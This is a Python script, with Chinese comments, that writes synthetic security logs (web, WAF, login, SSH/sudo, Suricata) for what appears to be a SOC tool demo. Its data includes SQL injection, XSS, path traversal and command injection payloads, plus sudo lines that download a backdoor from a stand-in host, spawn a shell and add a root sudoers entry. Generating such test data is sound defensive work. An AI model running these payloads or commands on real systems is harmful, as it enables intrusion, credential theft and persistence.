#!/usr/bin/env python3
"""模拟日志生成脚本 — 生成三个演示场景的日志数据"""
import sys
import os
import json
import random
import csv
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# 常量
OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "..", "demo_data")
ATTACKER_IP = "192.168.1.100"
TARGET_IP = "10.0.0.5"
TARGET_DOMAIN = "www.example.com"

SENSITIVE_PATHS = [
    "/admin", "/admin/", "/admin/login.php",
    "/.git/config", "/.env", "/backup/",
    "/wp-admin/admin-ajax.php", "/phpmyadmin/",
    "/config.php", "/server-status",
    "/actuator/health", "/actuator/env",
]

SQLI_PAYLOADS = [
    "/search?q=1'%20UNION%20SELECT%20*%20FROM%20users--",
    "/login?id=1%20OR%201=1",
    "/product?id=1%20AND%20SLEEP(5)",
    "/api/user?uid=1'%20OR%20'1'='1",
    "/search?q=1'%20AND%201=1%20UNION%20SELECT%20null,username,password%20FROM%20users--",
]

XSS_PAYLOADS = [
    "/search?q=<script>alert('xss')</script>",
    "/comment?text=<img%20src=x%20onerror=alert(1)>",
    "/profile?name=<svg%20onload=alert(document.cookie)>",
]

PATH_TRAVERSAL = [
    "/download?file=../../../etc/passwd",
    "/view?path=..%2f..%2f..%2fetc%2fpasswd",
    "/file?name=....//....//....//etc/passwd",
    "/api/read?f=../../../etc/shadow",
]

RCE_PAYLOADS = [
    "/ping?host=127.0.0.1;%20id",
    "/exec?cmd=cat%20/etc/passwd",
    "/api/run?command=whoami",
    "/debug?cmd=`id`",
]

LOGIN_IPS = ["192.168.1.100", "192.168.1.101", "192.168.1.102", "10.0.0.50"]
LOGIN_USERS = ["admin", "root", "testuser", "webadmin", "operator", "guest"]
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]
SCANNER_UAS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org)",
    "sqlmap/1.7.2#stable (http://sqlmap.org)",
    "Go-http-client/2.0",
    "curl/7.88.1",
    "Python-requests/2.31.0",
    "Mozilla/5.0 (compatible; Acunetix/14; http://www.acunetix.com)",
]


def generate_timestamp(base: datetime, offset_seconds: int):
    return base + timedelta(seconds=offset_seconds)


TIMESTAMPS_HOST_LOGIN = [
    "May  7 08:15:01",
    "May  7 08:20:30",
    "May  7 08:25:45",
    "May  7 08:30:00",
    "May  7 08:35:12",
    "May  7 08:40:33",
    "May  7 08:45:21",
    "May  7 08:50:07",
    "May  7 08:55:44",
    "May  7 09:00:00",
    "May  7 09:05:18",
    "May  7 09:10:55",
    "May  7 09:15:29",
    "May  7 09:20:01",
    "May  7 09:25:38",
]


def write_suricata_logs(path, base_time):
    """生成 Suricata eve.json 格式的网络安全日志"""
    import json
    events = []

    # 端口扫描事件
    for i in range(15):
        ts = generate_timestamp(base_time, 300 + i * 2)
        events.append({
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%f+0000"),
            "event_type": "alert",
            "src_ip": ATTACKER_IP,
            "src_port": random.randint(40000, 60000),
            "dest_ip": f"10.0.0.{random.randint(1, 10)}",
            "dest_port": random.choice([22, 80, 443, 3306, 8080, 8443]),
            "proto": "TCP",
            "alert": {
                "action": "allowed",
                "signature_id": 2010935,
                "signature": "ET SCAN Potential SSH Scan OUTBOUND",
                "category": "Potential Corporate Privacy Violation",
                "severity": 2,
            },
        })

    # 恶意软件/扫描告警
    for i in range(10):
        ts = generate_timestamp(base_time, 800 + i * 30)
        events.append({
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%f+0000"),
            "event_type": "alert",
            "src_ip": ATTACKER_IP,
            "src_port": random.randint(40000, 60000),
            "dest_ip": TARGET_IP,
            "dest_port": 80,
            "proto": "TCP",
            "alert": {
                "action": "blocked",
                "signature_id": 2024213,
                "signature": "ET WEB_SERVER Possible SQL Injection Attempt Detected",
                "category": "Web Application Attack",
                "severity": 1,
            },
            "http": {
                "hostname": TARGET_DOMAIN,
                "url": random.choice(["/search?q=1' UNION SELECT * FROM users--",
                                       "/product?id=1 AND 1=1",
                                       "/login?user=admin'--"]),
                "http_method": "GET",
                "http_user_agent": random.choice(SCANNER_UAS),
            },
        })

    # DNS 查询（C2 通信模拟）
    for i in range(5):
        ts = generate_timestamp(base_time, 1000 + i * 60)
        events.append({
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%f+0000"),
            "event_type": "dns",
            "src_ip": ATTACKER_IP,
            "src_port": random.randint(40000, 60000),
            "dest_ip": "8.8.8.8",
            "dest_port": 53,
            "proto": "UDP",
            "dns": {
                "rrtname": f"evil{random.randint(1,100)}.malware.example.com",
                "qtype": "A",
            },
        })

    with open(path, "w", encoding="utf-8") as f:
        json.dump(events, f, ensure_ascii=False, indent=2)
    print(f"[OK] Suricata 日志已生成: {path} ({len(events)} 条)")


def write_web_logs(path, base_time):
    """生成 Web 访问日志 (Nginx combined 格式 — 匹配 parse_nginx_log)"""
    lines = []

    def nginx_line(ip, ts_str, method, url, status, size, ua):
        return f'{ip} - - [{ts_str}] "{method} {url} HTTP/1.1" {status} {size} "-" "{ua}"'

    # 正常访问
    for i in range(20):
        ts = generate_timestamp(base_time, i * 30)
        lines.append(nginx_line(
            ip="10.0.0.10",
            ts_str=ts.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method=random.choice(["GET", "GET", "GET", "POST"]),
            url=random.choice(["/", "/index.html", "/about", "/contact", "/products", "/login"]),
            status=random.choice([200, 200, 200, 200, 301, 404]),
            size=random.randint(500, 5000),
            ua=random.choice(NORMAL_UAS),
        ))

    # 扫描探测
    for i in range(30):
        ts = generate_timestamp(base_time, 600 + i * 3)
        lines.append(nginx_line(
            ip=ATTACKER_IP,
            ts_str=ts.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method=random.choice(["GET", "HEAD"]),
            url=random.choice(SENSITIVE_PATHS[:8]),
            status=random.choice([200, 301, 403, 404, 404]),
            size=random.randint(100, 3000),
            ua=random.choice(SCANNER_UAS),
        ))

    # 敏感路径访问
    for i in range(10):
        ts = generate_timestamp(base_time, 900 + i * 10)
        lines.append(nginx_line(
            ip=ATTACKER_IP,
            ts_str=ts.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method="GET",
            url=random.choice(SENSITIVE_PATHS),
            status=random.choice([200, 200, 403, 404]),
            size=random.randint(100, 5000),
            ua=random.choice(SCANNER_UAS),
        ))

    # SQL 注入尝试
    for i, payload in enumerate(SQLI_PAYLOADS):
        ts = generate_timestamp(base_time, 1200 + i * 15)
        lines.append(nginx_line(
            ip=ATTACKER_IP,
            ts_str=ts.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method="GET",
            url=payload,
            status=random.choice([200, 500]),
            size=random.randint(500, 8000),
            ua=random.choice(SCANNER_UAS),
        ))

    # XSS 尝试
    for i, payload in enumerate(XSS_PAYLOADS):
        ts = generate_timestamp(base_time, 1350 + i * 20)
        lines.append(nginx_line(
            ip=ATTACKER_IP,
            ts_str=ts.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method="GET",
            url=payload,
            status=200,
            size=random.randint(500, 5000),
            ua=random.choice(SCANNER_UAS),
        ))

    # 路径穿越
    for i, payload in enumerate(PATH_TRAVERSAL):
        ts = generate_timestamp(base_time, 1500 + i * 15)
        lines.append(nginx_line(
            ip=ATTACKER_IP,
            ts_str=ts.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method="GET",
            url=payload,
            status=random.choice([200, 403, 500]),
            size=random.randint(200, 4000),
            ua=random.choice(SCANNER_UAS),
        ))

    # 命令执行
    for i, payload in enumerate(RCE_PAYLOADS):
        ts = generate_timestamp(base_time, 1650 + i * 20)
        lines.append(nginx_line(
            ip=ATTACKER_IP,
            ts_str=ts.strftime("%d/%b/%Y:%H:%M:%S +0000"),
            method="GET",
            url=payload,
            status=random.choice([200, 500]),
            size=random.randint(500, 10000),
            ua=random.choice(SCANNER_UAS),
        ))

    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    print(f"[OK] Web 日志已生成: {path} ({len(lines)} 条)")


def write_login_logs(path, base_time):
    """生成登录日志 (CSV)"""
    rows = []

    # 正常登录
    for i in range(15):
        ts = generate_timestamp(base_time, i * 120)
        rows.append({
            "time": ts.strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": random.choice(["10.0.0.10", "10.0.0.11", "10.0.0.12"]),
            "username": random.choice(["admin", "webadmin", "operator"]),
            "action": "login",
            "result": "success",
        })

    # 暴力破解
    for i in range(30):
        ts = generate_timestamp(base_time, 1800 + i * 5)
        rows.append({
            "time": ts.strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": ATTACKER_IP,
            "username": random.choice(LOGIN_USERS),
            "action": "login",
            "result": "fail",
        })

    # 暴力破解成功后登录
    ts = generate_timestamp(base_time, 1950)
    rows.append({
        "time": ts.strftime("%Y-%m-%d %H:%M:%S"),
        "src_ip": ATTACKER_IP,
        "username": "webadmin",
        "action": "login",
        "result": "success",
    })

    # 异常时间登录
    for i in range(5):
        ts = generate_timestamp(base_time + timedelta(hours=3), i * 60)
        rows.append({
            "time": ts.strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": "10.0.0.50",
            "username": "guest",
            "action": "login",
            "result": "success",
        })

    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["time", "src_ip", "username", "action", "result"])
        writer.writeheader()
        writer.writerows(rows)
    print(f"[OK] 登录日志已生成: {path} ({len(rows)} 条)")


def write_waf_logs(path, base_time):
    """生成 WAF 告警日志 (JSON)"""
    events = []

    waf_rules = [
        {"rule_id": "WAF-0001", "attack_type": "SQL Injection"},
        {"rule_id": "WAF-0002", "attack_type": "SQL Injection"},
        {"rule_id": "WAF-0011", "attack_type": "XSS"},
        {"rule_id": "WAF-0021", "attack_type": "Path Traversal"},
        {"rule_id": "WAF-0031", "attack_type": "Command Injection"},
        {"rule_id": "WAF-0101", "attack_type": "Scanner Detection"},
    ]

    for i in range(25):
        ts = generate_timestamp(base_time, 900 + i * 30)
        rule = random.choice(waf_rules)
        events.append({
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
            "src_ip": ATTACKER_IP,
            "dst_ip": TARGET_IP,
            "rule_id": rule["rule_id"],
            "attack_type": rule["attack_type"],
            "action": random.choice(["block", "alert", "alert"]),
            "url": random.choice([
                "/search?q=test", "/login", "/api/data",
                "/download?file=doc.pdf", "/upload",
            ]),
            "severity": random.choice(["high", "medium", "critical"]),
            "request_method": "GET",
            "user_agent": random.choice(SCANNER_UAS),
        })

    # 添加几条严重告警
    critical_events = [
        {"ts_offset": 1400, "attack_type": "SQL Injection", "url": "/api/user?uid=1 UNION SELECT * FROM users"},
        {"ts_offset": 1550, "attack_type": "Command Injection", "url": "/ping?host=127.0.0.1;cat /etc/passwd"},
        {"ts_offset": 1700, "attack_type": "Path Traversal", "url": "/download?file=../../etc/shadow"},
    ]
    for ev in critical_events:
        ts = generate_timestamp(base_time, ev["ts_offset"])
        events.append({
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
            "src_ip": ATTACKER_IP,
            "dst_ip": TARGET_IP,
            "rule_id": "WAF-0099",
            "attack_type": ev["attack_type"],
            "action": "block",
            "url": ev["url"],
            "severity": "critical",
            "request_method": "GET",
            "user_agent": "sqlmap/1.7.2#stable (http://sqlmap.org)",
        })

    with open(path, "w", encoding="utf-8") as f:
        json.dump(events, f, ensure_ascii=False, indent=2)
    print(f"[OK] WAF 日志已生成: {path} ({len(events)} 条)")


def write_host_logs(path, base_time):
    """生成主机安全日志 (SSH auth + sudo 格式)"""
    lines = []

    # 正常 SSH 登录
    for i, ts in enumerate(TIMESTAMPS_HOST_LOGIN):
        hostname = "socmind-server"
        user = "admin" if i < 8 else "operator"
        ip = "10.0.0.10" if i < 10 else "10.0.0.20"
        port = random.randint(40000, 60000)
        lines.append(
            f"{ts} {hostname} sshd[{random.randint(1000,9999)}]: "
            f"Accepted password for {user} from {ip} port {port} ssh2"
        )

    # SSH 暴力破解尝试 (从攻击者 IP)
    for i in range(30):
        ts_offset = 1800 + i * 5
        ts_dt = generate_timestamp(base_time, ts_offset)
        ts_str = ts_dt.strftime("%b %d %H:%M:%S").lstrip("0").replace("  ", " ")
        user = random.choice(["root", "admin", "webadmin", "test", "deploy", "oracle"])
        lines.append(
            f"{ts_str} socmind-server sshd[{random.randint(1000,9999)}]: "
            f"Failed password for {user} from {ATTACKER_IP} port {random.randint(1000,9999)} ssh2"
        )

    # SSH 暴力破解成功后登录
    ts_dt = generate_timestamp(base_time, 1950)
    ts_str = ts_dt.strftime("%b %d %H:%M:%S").lstrip("0").replace("  ", " ")
    lines.append(
        f"{ts_str} socmind-server sshd[{random.randint(1000,9999)}]: "
        f"Accepted password for root from {ATTACKER_IP} port 44322 ssh2"
    )

    # 可疑 sudo 命令执行
    sudo_commands = [
        "/bin/cat /etc/shadow",
        "/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
        "/usr/bin/wget http://evil.example.com/backdoor.sh",
        "/bin/chmod 777 /etc/passwd",
        "/usr/bin/useradd -u 0 hackuser",
        "/bin/cat /etc/sudoers",
        "/bin/bash -c 'echo \"hackuser ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'",
    ]
    for i, cmd in enumerate(sudo_commands):
        ts_dt = generate_timestamp(base_time, 2100 + i * 30)
        ts_str = ts_dt.strftime("%b %d %H:%M:%S").lstrip("0").replace("  ", " ")
        lines.append(
            f"{ts_str} socmind-server sudo[{random.randint(2000,9999)}]: "
            f"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND={cmd}"
        )

    # 异常时间段 SSH 登录 (凌晨 3 点)
    for i in range(3):
        ts_dt = generate_timestamp(base_time + timedelta(hours=19), i * 120)
        ts_str = ts_dt.strftime("%b %d %H:%M:%S").lstrip("0").replace("  ", " ")
        lines.append(
            f"{ts_str} socmind-server sshd[{random.randint(1000,9999)}]: "
            f"Accepted password for guest from 203.0.113.50 port {random.randint(10000,60000)} ssh2"
        )

    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    print(f"[OK] 主机日志已生成: {path} ({len(lines)} 条)")


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    base_time = datetime(2026, 5, 7, 8, 0, 0, tzinfo=timezone.utc)
    write_web_logs(os.path.join(OUTPUT_DIR, "web_access.log"), base_time)
    write_login_logs(os.path.join(OUTPUT_DIR, "login_logs.csv"), base_time)
    write_waf_logs(os.path.join(OUTPUT_DIR, "waf_alerts.json"), base_time)
    write_host_logs(os.path.join(OUTPUT_DIR, "host_auth.log"), base_time)
    write_suricata_logs(os.path.join(OUTPUT_DIR, "suricata_eve.json"), base_time)
    print(f"\n[SUCCESS] 演示数据已生成至: {OUTPUT_DIR}")
    print("  文件列表:")
    for f in os.listdir(OUTPUT_DIR):
        fpath = os.path.join(OUTPUT_DIR, f)
        size = os.path.getsize(fpath)
        print(f"    - {f} ({size:,} bytes)")


if __name__ == "__main__":
    main()
